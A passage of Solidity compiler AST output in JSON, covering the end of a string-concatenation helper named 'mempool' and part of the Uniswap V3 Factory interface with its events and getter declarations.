														"mutability": "mutable",
														"name": "j",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1576,
														"src": "17125:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1524,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "17125:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1526,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "17125:6:0"
											},
											{
												"body": {
													"id": 1547,
													"nodeType": "Block",
													"src": "17179:57:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1545,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 1538,
																		"name": "_newValue",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1515,
																		"src": "17194:9:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 1541,
																	"indexExpression": {
																		"argumentTypes": null,
																		"id": 1540,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "UnaryOperation",
																		"operator": "++",
																		"prefix": false,
																		"src": "17204:3:0",
																		"subExpression": {
																			"argumentTypes": null,
																			"id": 1539,
																			"name": "j",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1525,
																			"src": "17204:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "17194:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 1542,
																		"name": "_baseBytes",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1490,
																		"src": "17211:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 1544,
																	"indexExpression": {
																		"argumentTypes": null,
																		"id": 1543,
																		"name": "i",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1522,
																		"src": "17222:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "IndexAccess",
																	"src": "17211:13:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"src": "17194:30:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"id": 1546,
															"nodeType": "ExpressionStatement",
															"src": "17194:30:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1534,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1531,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1522,
														"src": "17153:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1532,
															"name": "_baseBytes",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1490,
															"src": "17155:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														},
														"id": 1533,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "length",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "17155:17:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "17153:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1548,
												"initializationExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 1529,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 1527,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1522,
															"src": "17148:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 1528,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "17150:1:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"src": "17148:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1530,
													"nodeType": "ExpressionStatement",
													"src": "17148:3:0"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 1536,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": false,
														"src": "17174:3:0",
														"subExpression": {
															"argumentTypes": null,
															"id": 1535,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1522,
															"src": "17174:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1537,
													"nodeType": "ExpressionStatement",
													"src": "17174:3:0"
												},
												"nodeType": "ForStatement",
												"src": "17144:92:0"
											},
											{
												"body": {
													"id": 1569,
													"nodeType": "Block",
													"src": "17284:58:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1567,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 1560,
																		"name": "_newValue",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1515,
																		"src": "17299:9:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 1563,
																	"indexExpression": {
																		"argumentTypes": null,
																		"id": 1562,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "UnaryOperation",
																		"operator": "++",
																		"prefix": false,
																		"src": "17309:3:0",
																		"subExpression": {
																			"argumentTypes": null,
																			"id": 1561,
																			"name": "j",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1525,
																			"src": "17309:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "17299:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 1564,
																		"name": "_valueBytes",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1497,
																		"src": "17316:11:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 1566,
																	"indexExpression": {
																		"argumentTypes": null,
																		"id": 1565,
																		"name": "i",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1522,
																		"src": "17328:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "IndexAccess",
																	"src": "17316:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"src": "17299:31:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"id": 1568,
															"nodeType": "ExpressionStatement",
															"src": "17299:31:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1556,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1553,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1522,
														"src": "17257:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1554,
															"name": "_valueBytes",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1497,
															"src": "17259:11:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														},
														"id": 1555,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "length",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "17259:18:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "17257:20:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1570,
												"initializationExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 1551,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 1549,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1522,
															"src": "17252:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 1550,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "17254:1:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"src": "17252:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1552,
													"nodeType": "ExpressionStatement",
													"src": "17252:3:0"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 1558,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": false,
														"src": "17279:3:0",
														"subExpression": {
															"argumentTypes": null,
															"id": 1557,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1522,
															"src": "17279:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1559,
													"nodeType": "ExpressionStatement",
													"src": "17279:3:0"
												},
												"nodeType": "ForStatement",
												"src": "17248:94:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1573,
															"name": "_newValue",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1515,
															"src": "17368:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"id": 1572,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "17361:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_string_storage_ptr_$",
															"typeString": "type(string storage pointer)"
														},
														"typeName": {
															"id": 1571,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "17361:6:0",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 1574,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "17361:17:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 1488,
												"id": 1575,
												"nodeType": "Return",
												"src": "17354:24:0"
											}
										]
									},
									"documentation": null,
									"id": 1577,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mempool",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1485,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1482,
												"mutability": "mutable",
												"name": "_base",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1577,
												"src": "16773:19:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1481,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "16773:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1484,
												"mutability": "mutable",
												"name": "_value",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1577,
												"src": "16794:20:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1483,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "16794:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "16772:43:0"
									},
									"returnParameters": {
										"id": 1488,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1487,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1577,
												"src": "16839:13:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1486,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "16839:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "16838:15:0"
									},
									"scope": 1578,
									"src": "16756:630:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								}
							],
							"scope": 1579,
							"src": "520:16871:0"
						}
					],
					"src": "32:17359:0"
				},
				"id": 0
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Factory.sol",
					"exportedSymbols": {
						"IUniswapV3Factory": [
							1661
						]
					},
					"id": 1662,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1580,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:1"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 1581,
								"nodeType": "StructuredDocumentation",
								"src": "71:163:1",
								"text": "@title The interface for the Uniswap V3 Factory\n @notice The Uniswap V3 Factory facilitates creation of Uniswap V3 pools and control over the protocol fees"
							},
							"fullyImplemented": false,
							"id": 1661,
							"linearizedBaseContracts": [
								1661
							],
							"name": "IUniswapV3Factory",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"anonymous": false,
									"documentation": {
										"id": 1582,
										"nodeType": "StructuredDocumentation",
										"src": "268:185:1",
										"text": "@notice Emitted when the owner of the factory is changed\n @param oldOwner The owner before the owner was changed\n @param newOwner The owner after the owner was changed"
									},
									"id": 1588,
									"name": "OwnerChanged",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1587,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1584,
												"indexed": true,
												"mutability": "mutable",
												"name": "oldOwner",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1588,
												"src": "477:24:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1583,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "477:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1586,
												"indexed": true,
												"mutability": "mutable",
												"name": "newOwner",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1588,
												"src": "503:24:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1585,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "503:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "476:52:1"
									},
									"src": "458:71:1"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1589,
										"nodeType": "StructuredDocumentation",
										"src": "535:421:1",
										"text": "@notice Emitted when a pool is created\n @param token0 The first token of the pool by address sort order\n @param token1 The second token of the pool by address sort order\n @param fee The fee collected upon every swap in the pool, denominated in hundredths of a bip\n @param tickSpacing The minimum number of ticks between initialized ticks\n @param pool The address of the created pool"
									},
									"id": 1601,
									"name": "PoolCreated",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1600,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1591,
												"indexed": true,
												"mutability": "mutable",
												"name": "token0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1601,
												"src": "988:22:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1590,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "988:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1593,
												"indexed": true,
												"mutability": "mutable",
												"name": "token1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1601,
												"src": "1020:22:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1592,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1020:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1595,
												"indexed": true,
												"mutability": "mutable",
												"name": "fee",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1601,
												"src": "1052:18:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 1594,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "1052:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1597,
												"indexed": false,
												"mutability": "mutable",
												"name": "tickSpacing",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1601,
												"src": "1080:17:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1596,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1080:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1599,
												"indexed": false,
												"mutability": "mutable",
												"name": "pool",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1601,
												"src": "1107:12:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1598,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1107:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "978:147:1"
									},
									"src": "961:165:1"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1602,
										"nodeType": "StructuredDocumentation",
										"src": "1132:275:1",
										"text": "@notice Emitted when a new fee amount is enabled for pool creation via the factory\n @param fee The enabled fee, denominated in hundredths of a bip\n @param tickSpacing The minimum number of ticks between initialized ticks for pools created with the given fee"
									},
									"id": 1608,
									"name": "FeeAmountEnabled",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1607,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1604,
												"indexed": true,
												"mutability": "mutable",
												"name": "fee",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1608,
												"src": "1435:18:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 1603,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "1435:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1606,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickSpacing",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1608,
												"src": "1455:25:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1605,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1455:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1434:47:1"
									},
									"src": "1412:70:1"
								},
								{
									"body": null,
									"documentation": {
										"id": 1609,
										"nodeType": "StructuredDocumentation",
										"src": "1488:163:1",
										"text": "@notice Returns the current owner of the factory\n @dev Can be changed by the current owner via setOwner\n @return The address of the factory owner"
									},
									"functionSelector": "8da5cb5b",
									"id": 1614,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "owner",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1610,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1670:2:1"
									},
									"returnParameters": {
										"id": 1613,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1612,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1614,
												"src": "1696:7:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1611,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1696:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1695:9:1"
									},
									"scope": 1661,
									"src": "1656:49:1",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1615,
										"nodeType": "StructuredDocumentation",
										"src": "1711:348:1",
										"text": "@notice Returns the tick spacing for a given fee amount, if enabled, or 0 if not enabled\n @dev A fee amount can never be removed, so this value should be hard coded or cached in the calling context\n @param fee The enabled fee, denominated in hundredths of a bip. Returns 0 in case of unenabled fee\n @return The tick spacing"
									},
									"functionSelector": "22afcccb",
									"id": 1622,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "feeAmountTickSpacing",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1618,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1617,
												"mutability": "mutable",
												"name": "fee",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1622,
												"src": "2094:10:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint24",
													"typeString": "uint24"
												},
												"typeName": {
													"id": 1616,
													"name": "uint24",
													"nodeType": "ElementaryTypeName",
													"src": "2094:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint24",
														"typeString": "uint24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2093:12:1"
									},
									"returnParameters": {
										"id": 1621,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1620,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1622,
												"src": "2129:5:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1619,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2129:5:1",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2128:7:1"
									},
									"scope": 1661,
									"src": "2064:72:1",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1623,
										"nodeType": "StructuredDocumentation",
										"src": "2142:471:1",
										"text": "@notice Returns the pool address for a given pair of tokens and a fee, or address 0 if it does not exist\n @dev tokenA and tokenB may be passed in either token0/token1 or token1/token0 order\n @param tokenA The contract address of either token0 or token1\n @param tokenB The contract address of the other token\n @param fee The fee collected upon every swap in the pool, denominated in hundredths of a bip\n @return pool The pool address"
									},
									"functionSelector": "1698ee82",
									"id": 1634,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "getPool",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1630,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1625,
												"mutability": "mutable",
												"name": "tokenA",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1634,
												"src": "2644:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1624,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2644:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1627,
												"mutability": "mutable",
												"name": "tokenB",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1634,
												"src": "2668:14:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1626,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2668:7:1",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
